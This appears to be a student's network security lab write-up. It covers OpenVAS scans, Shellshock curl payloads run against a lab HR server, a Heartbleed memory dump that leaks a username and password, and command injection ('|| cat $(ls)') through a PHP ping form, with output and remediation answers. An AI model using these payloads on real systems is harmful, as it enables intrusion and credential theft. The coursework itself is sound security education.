# 7.2

The scan picks up the heartbleed vulnerability, but not the shellshock vulnerability. This is likely because OpenVAS doesn't know the path to servers with bash files hosted on the HR machine that it could test for vulnerable bash files. It can't try every arbitrary path, so without knowing that http://hr.ep.int.e-netsec.org/cgi-bin/uptime exists in order to try a shellshock attack, it doesn't detect that the HR machine is vulnerable.

The report is in `7.2 report.pdf`.

# 7.3

The reports are in `7.3 report1.pdf` and `7.3 report2.pdf`

# 7.4

$ curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://hr.ep.int.e-netsec.org/cgi-bin/uptime
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$  curl -H "User-Agent: () { :; }; echo; /sbin/ifconfig" http://hr.ep.int.e-netsec.org/cgi-bin/uptime
eth0      Link encap:Ethernet  HWaddr e2:b2:df:1b:32:ca
          inet addr:10.10.152.150  Bcast:10.10.152.255  Mask:255.255.255.128
          inet6 addr: fe80::e0b2:dfff:fe1b:32ca/64 Scope:Link
          inet6 addr: 2001:470:8cc5:3203:eece:13ff:feea:32f3/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:257264 errors:0 dropped:0 overruns:0 frame:0
          TX packets:251643 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:43997783 (41.9 MiB)  TX bytes:123817226 (118.0 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:205764 errors:0 dropped:0 overruns:0 frame:0
          TX packets:205764 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:66263687 (63.1 MiB)  TX bytes:66263687 (63.1 MiB)

# 7.5

Running the heartbleed script with:

```
python heartbleed.py hr.ep.int.e-netsec.org
```

We get the following response:

```
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .@....SC[...r....+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 .w.3....f.....".!.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 ............................3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 ....E.D...../...A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00 ..................I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 2...............................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00 10 00 11 00 23 00 00 00 0F 00 01 01 6F 6E 2F 78 ....................#.......on/x
  00e0: 2D 77 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 -www-form-urlencoded..Content-Le
  0100: 6E 67 74 68 3A 20 38 31 0D 0A 0D 0A 5F 6D 65 74 68 6F 64 3D 50 4F 53 54 26 64 61 74 61 25 35 42 ngth: 81...._method=POST&data%5B
  0120: 55 73 65 72 25 35 44 25 35 42 75 73 65 72 6E 61 6D 65 25 35 44 3D 62 6F 62 26 64 61 74 61 25 35 User%5D%5Busername%5D=bob&data%5
  0140: 42 55 73 65 72 25 35 44 25 35 42 70 61 73 73 77 6F 72 64 25 35 44 3D 31 32 33 34 35 36 BC 97 94 BUser%5D%5Bpassword%5D=123456...
  0160: FB AD FB 6F 81 59 11 2A 94 C5 06 FC B7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...o.Y.*........................
```

from which we can determine the username is `bob` and the password is `123456`.

Screenshots of the timesheet website are in `timesheet1.png` and `timesheet2.png`.

# 7.6

OpenVAS reports applications for each host. The only host with samba installed is `10.10.152.150`. Its samba version is 3.6.6, which is vulnerable to the SambaCry attack ("since version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14")

# 7.7

putting the following input into the text box is enough to execute arbitrary bash:

```
|| /usr/bin/id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
|| /bin/pwd
# /var/www/html
```

```
|| /sbin/ifconfig
# eth0: flags=4163  mtu 1500
#         inet 10.10.92.26  netmask 255.255.255.0  broadcast 10.10.92.255
#         inet6 2001:470:8cc5:3201:4e44:5bff:fe32:2aa  prefixlen 64  scopeid 0x0
#         inet6 fe80::4e44:5bff:fe32:2aa  prefixlen 64  scopeid 0x20
#         ether 4c:44:5b:32:02:aa  txqueuelen 1000  (Ethernet)
#         RX packets 5104454  bytes 907362804 (865.3 MiB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 4962994  bytes 1333489206 (1.2 GiB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
#
# lo: flags=73  mtu 65536
#         inet 127.0.0.1  netmask 255.0.0.0
#         inet6 ::1  prefixlen 128  scopeid 0x10
#         loop  txqueuelen 1000  (Local Loopback)
#         RX packets 1836  bytes 145889 (142.4 KiB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 1836  bytes 145889 (142.4 KiB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

As for getting the source, `|| cat $(ls)` gives us the source of all the files:

```
$output
";
if (isset($_GET["ip"]))
{
	$cmd = "ping -c 3 ".$_GET["ip"]." 2>&1";
	$output = shell_exec($cmd);
	echo "
".$cmd."
".$output."
";
}
?>
```


To create a text file, we can run `|| echo "hello" >> hello.txt`. Screenshot of accessing this file is in `hello.png`.

# 7.8

"Are vulnerability scanners efficient in finding all the vulnerabilities of a system? Explain some
situations where vulnerability scanners may not work efficiently"

Vulnerability scanners are good tools, but they can miss some vulnerabilities. For instance, as they don't have access to the source code of files on the machines, they may not know which webpages or urls will respond to http requests, since that is handled dynamically by many web servers. This means that there might be a webpage vulnerable to command injection or a similar vulnerability (sql injection) that is not feasible for the scanner to detect.

"Analyze any three high or medium risk vulnerability that you found in your reports. What
caused these vulnerabilities? What are some of the steps you can take to remediate these
vulnerabilities?"

1. "jQuery < 1.9.0 XSS Vulnerability". There is a vulnerability in the javascript plugin jquery which gives users more flexibility in constructing xss attacks than it should (allows < anywhere in the string instead of only at the beginning when interpreting as html). To fix this vulnerability, the host should upgrade the jquery version.
2. "Weak Encryption Algorithm(s) Supported (SSH)". The ssh server on this host accepts both weak client-to-server encryption algorithms and server-to-client encryption algorithms. This inclueds cbc mode ciphers and ciphers like arcfour. To fix this vulnerability, the host should disable the weak encryption algorithms for both client-to-server and server-to-client.
3. "Apache HTTP Server ETag Header Information Disclosure Weakness". Vulnerable apache servers can return sensitive information in headers, like the size and inode of files. To fix this vulnerability, the host should update the apache version.
